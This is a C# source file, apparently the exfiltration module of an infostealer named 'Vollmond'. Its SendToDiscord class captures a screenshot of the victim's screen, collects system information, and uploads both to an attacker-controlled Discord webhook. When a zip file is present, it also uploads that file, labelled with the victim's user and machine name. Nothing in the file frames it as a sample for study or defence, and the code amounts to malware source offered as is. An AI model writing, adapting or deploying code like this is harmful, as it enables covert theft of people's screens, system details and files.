namespace Vollmond
{
    internal class SendToDiscord
    {
        public static async void Send()
        {
            using (var httpClient = new HttpClient())
            using (var multipart = new MultipartFormDataContent())
            {
                var systemInfo = Auxiliary.GetSystemInfo();

                if (!String.IsNullOrEmpty(Program.zipPath))
                {
                    string screenshot_path = Auxiliary.MakeScreenshot();

                    using var zipStream = File.OpenRead(Program.zipPath);
                    using var screenshotStream = File.OpenRead(screenshot_path);

                    multipart.Add(new StringContent(await Auxiliary.GetSystemInfo()), "content"); // Main message with info
                    multipart.Add(new StringContent("Vollmond"), "username"); // webhook's name
                    multipart.Add(new StringContent("https://tengrinews.kz/userdata/news/2023/news_509043/thumb_m/photo_442217.jpeg"), "avatar_url");

                    var zipContent = new StreamContent(zipStream);
                    multipart.Add(zipContent, "file0", $@"{Environment.UserName}@{Environment.MachineName}.zip"); // data

                    var screenContent = new StreamContent(screenshotStream);
                    multipart.Add(screenContent, "file1", "screenshot.png"); // screenshot

                    await httpClient.PostAsync(URLs.webhook, multipart); // sending
                }
                else
                {
                    string screenshot_path = Auxiliary.MakeScreenshot();
                    ;
                    using var screenshotStream = File.OpenRead(screenshot_path);

                    multipart.Add(new StringContent(await Auxiliary.GetSystemInfo()), "content"); // Main message with info
                    multipart.Add(new StringContent("Vollmond"), "username"); // webhooks 's name
                    multipart.Add(new StringContent("https://tengrinews.kz/userdata/news/2023/news_509043/thumb_m/photo_442217.jpeg"), "avatar_url");

                    var screenContent = new StreamContent(screenshotStream);
                    multipart.Add(screenContent, "file0", "screenshot.png"); // screenshot

                    await httpClient.PostAsync(URLs.webhook, multipart); // sending
                }
            }
        }
    }
}
